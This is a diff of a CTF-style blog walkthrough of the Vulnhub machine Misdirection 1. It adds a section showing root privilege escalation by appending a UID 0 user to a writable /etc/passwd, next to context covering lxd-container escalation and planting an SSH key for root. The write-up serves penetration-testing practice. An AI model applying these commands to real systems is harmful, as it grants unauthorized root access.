@@ -157,13 +157,17 @@
   
   <span class="post-tags">
     
-    #<a href="https://blog.ikuamike.io/tags/oscp-prep/">OSCP Prep</a>&nbsp;
+    #<a href="https://blog.ikuamike.io/tags/beginner/">Beginner</a>&nbsp;
     
     #<a href="https://blog.ikuamike.io/tags/vulnhub/">Vulnhub</a>&nbsp;
+    
+    #<a href="https://blog.ikuamike.io/tags/oscp-prep/">OSCP Prep</a>&nbsp;
     
     #<a href="https://blog.ikuamike.io/tags/sudo/">Sudo</a>&nbsp;
     
     #<a href="https://blog.ikuamike.io/tags/lxd/">lxd</a>&nbsp;
+    
+    #<a href="https://blog.ikuamike.io/tags/writeable-passwd/">Writeable Passwd</a>&nbsp;
     
   </span>
   
@@ -277,7 +281,8 @@ any password requirement.</p>
   <img src="/img/misdirection1/misdirection-10.png"  class="center"  style="border-radius: 8px;"  />
 
 
-<p>Being in the lxd group allows for privilege escalation. First we need to add am image then create a container.</p>
+<h1 id="shell-as-root">Shell as root</h1>
+<p>Brexit being in the lxd group allows for privilege escalation. First we need to add am image then create a container.</p>
 <p>First we need to get distrobuilder, the compile it. This uses go to compile therefore you need go to be installed.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">wget https://github.com/lxc/distrobuilder/archive/refs/tags/distrobuilder-1.2.zip
 7z x distrobuilder-1.2.zip
@@ -323,6 +328,30 @@ lxc exec privesc /bin/sh
 <p>To get shell as root I added a public key to authorized_keys of the root user and can ssh in as root.</p>
 
   <img src="/img/misdirection1/misdirection-9.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<h1 id="extras">Extras</h1>
+<p>After looking at other writeups, there was another easy privesc that I didn&rsquo;t explore.</p>
+<ul>
+<li>Writeable /etc/passwd file</li>
+</ul>
+<p>The passwd file is writeable by the users in the brexit group.</p>
+
+  <img src="/img/misdirection1/misdirection-11.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>We can add user with id 0 that will give us root privileges.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">openssl passwd -1 -salt user password123
+
+echo <span style="color:#e6db74">&#39;user:$1$user$nY3qj2koDQU1.5HG4ZTj9/:0:0:User:/root:/bin/bash&#39;</span> &gt;&gt;/etc/passwd
+</code></pre></div>
+  <img src="/img/misdirection1/misdirection-12.png"  class="center"  style="border-radius: 8px;"  />
+
+
+<h1 id="references">References</h1>
+<p><a href="https://rioasmara.com/2021/01/29/privilege-escalation-with-lxd/">https://rioasmara.com/2021/01/29/privilege-escalation-with-lxd/</a></p>
+<p><a href="https://www.hackingarticles.in/lxd-privilege-escalation/">https://www.hackingarticles.in/lxd-privilege-escalation/</a></p>
+<p><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-etc-passwd">https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-etc-passwd</a></p>
   </div>
 
   
